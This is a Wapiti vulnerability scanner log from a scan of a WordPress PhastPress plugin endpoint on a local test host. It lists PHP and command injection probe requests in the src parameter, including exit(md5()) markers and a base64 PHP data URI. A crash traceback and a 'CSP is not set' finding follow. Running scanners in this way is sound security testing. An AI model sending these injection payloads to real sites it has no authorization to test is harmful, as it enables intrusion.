2024-03-21 13:19:30.467 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=set&service=scripts (0)
2024-03-21 13:19:30.488 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=env&service=scripts (0)
2024-03-21 13:19:30.510 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%2Fe%00&service=scripts (0)
2024-03-21 13:19:30.531 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&service=scripts (0)
2024-03-21 13:19:30.553 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&service=scripts (0)
2024-03-21 13:19:30.574 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&service=scripts (0)
2024-03-21 13:19:30.595 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&service=scripts (0)
2024-03-21 13:19:30.617 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&service=scripts (0)
2024-03-21 13:19:30.638 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&service=scripts (0)
2024-03-21 13:19:30.660 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&service=scripts (0)
2024-03-21 13:19:30.682 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&service=scripts (0)
2024-03-21 13:19:30.705 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&service=scripts (0)
2024-03-21 13:19:30.728 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&service=scripts (0)
2024-03-21 13:19:30.752 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&service=scripts (0)
2024-03-21 13:19:30.775 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&service=scripts (0)
2024-03-21 13:19:30.799 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&service=scripts (0)
2024-03-21 13:19:30.821 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
Traceback (most recent call last):

  File "/usr/local/bin/wapiti", line 8, in <module>
    sys.exit(wapiti_asyncio_wrapper())
    │   │    └ <function wapiti_asyncio_wrapper at 0x7425c729c900>
    │   └ <built-in function exit>
    └ <module 'sys' (built-in)>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
    asyncio.run(wapiti_main())
    │       │   └ <function wapiti_main at 0x7425c729c860>
    │       └ <function run at 0x7425cbfab560>
    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
    return runner.run(main)
           │      │   └ <coroutine object wapiti_main at 0x7425c74d7240>
           │      └ <function Runner.run at 0x7425cbe36fc0>
           └ <asyncio.runners.Runner object at 0x7425ca00d6d0>
  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
           │    │     └ <function BaseEventLoop.run_until_complete at 0x7425cbe34c20>
           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
           └ <asyncio.runners.Runner object at 0x7425ca00d6d0>
  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
    self.run_forever()
    │    └ <function BaseEventLoop.run_forever at 0x7425cbe34b80>
    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
    self._run_once()
    │    └ <function BaseEventLoop._run_once at 0x7425cbe36980>
    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
    handle._run()
    │      └ <function Handle._run at 0x7425cbf98e00>
    └ <Handle <TaskStepMethWrapper object at 0x7425c6b37910>()>
  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
    self._context.run(self._callback, *self._args)
    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x7425c6b37910>()>
    │    │            │    └ <member '_callback' of 'Handle' objects>
    │    │            └ <Handle <TaskStepMethWrapper object at 0x7425c6b37910>()>
    │    └ <member '_context' of 'Handle' objects>
    └ <Handle <TaskStepMethWrapper object at 0x7425c6b37910>()>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
    await wap.attack(global_stop_event)
          │   │      └ <asyncio.locks.Event object at 0x7425cbe91a90 [unset]>
          │   └ <function Wapiti.attack at 0x7425c72a6520>
          └ <wapitiCore.controller.wapiti.Wapiti object at 0x7425c7583b90>
> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
    await attack_module.attack(original_request, original_response)
          │             │      │                 └ <wapitiCore.net.response.Response object at 0x7425c6b629d0>
          │             │      └ GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
          │             └ <function ModuleExec.attack at 0x7425c6d9b9c0>
          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x7425c6dbed50>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
    response: Response = await self.crawler.async_send(mutated_request)
    │                          │    │       │          └ GET http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D...
    │                          │    │       └ <function AsyncCrawler.async_send at 0x7425cac96020>
    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>
    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x7425c6dbed50>
    └ <wapitiCore.net.response.Response object at 0x7425c6d51bd0>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
    response = await self.async_get(request, headers=headers,
                     │    │         │                └ None
                     │    │         └ GET http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D...
                     │    └ <function AsyncCrawler.async_get at 0x7425cac96160>
                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
    value = await function(*args, **kwargs)
                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>, GET http://web/wp-content/plugins/phastpress/phast.php?src=d...
                  └ <function AsyncCrawler.async_get at 0x7425cac960c0>
  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
    response = await self._client.send(
                     │    │       └ <function AsyncClient.send at 0x7425cb1fd1c0>
                     │    └ <httpx.AsyncClient object at 0x7425c756b2d0>
                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7425c715b110>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
    response = await self._send_handling_auth(
                     │    └ <function AsyncClient._send_handling_auth at 0x7425cb1fd260>
                     └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
    response = await self._send_handling_redirects(
                     │    └ <function AsyncClient._send_handling_redirects at 0x7425cb1fd300>
                     └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
    raise exc
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
    request = self._build_redirect_request(request, response)
              │    │                       │        └ <Response [301 Moved Permanently]>
              │    │                       └ <Request('GET', 'http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YW...
              │    └ <function BaseClient._build_redirect_request at 0x7425cb1efc40>
              └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
    url = self._redirect_url(request, response)
          │    │             │        └ <Response [301 Moved Permanently]>
          │    │             └ <Request('GET', 'http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YW...
          │    └ <function BaseClient._redirect_url at 0x7425cb1efd80>
          └ <httpx.AsyncClient object at 0x7425c756b2d0>
  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
    url = url.copy_with(host=request.url.host)
          │   │              │       │   └ <property object at 0x7425cb8ee340>
          │   │              │       └ URL('http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3...
          │   │              └ <Request('GET', 'http://web/wp-content/plugins/phastpress/phast.php?src=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YW...
          │   └ <function URL.copy_with at 0x7425cb90d8a0>
          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
    return URL(self, **kwargs)
           │   │       └ {'host': 'web'}
           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
           └ <class 'httpx.URL'>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
    self._uri_reference = url._uri_reference.copy_with(**kwargs)
    │                     │   │              │           └ {'host': 'web'}
    │                     │   │              └ <function ParseResult.copy_with at 0x7425cb90c400>
    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
    └ <unprintable URL object>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
    return urlparse("", **defaults)
           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
           └ <function urlparse at 0x7425cb90c220>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
    │             │                │                         └ True
    │             │                └ True
    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
    └ <function validate_path at 0x7425cb90ca40>
  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
          └ <class 'httpx.InvalidURL'>

httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
2024-03-21 13:19:30.910 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
2024-03-21 13:19:30.986 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report a6bc6142-e785-11ee-a16d-0242ac160004 ... SUCCESS
2024-03-21 13:19:30.989 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 13:19:31.001 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/phastpress/phast.php?src=fuzz&service=scripts (0)
2024-03-21 13:19:31.025 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-21 13:19:31.114 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 13:19:31.143 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-21 13:19:31.252 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-21 13:19:31.294 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//phastpress.json/
2024-03-21 13:19:31.295 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//phastpress.json/web_03212024_1319.html with a browser to see this report.
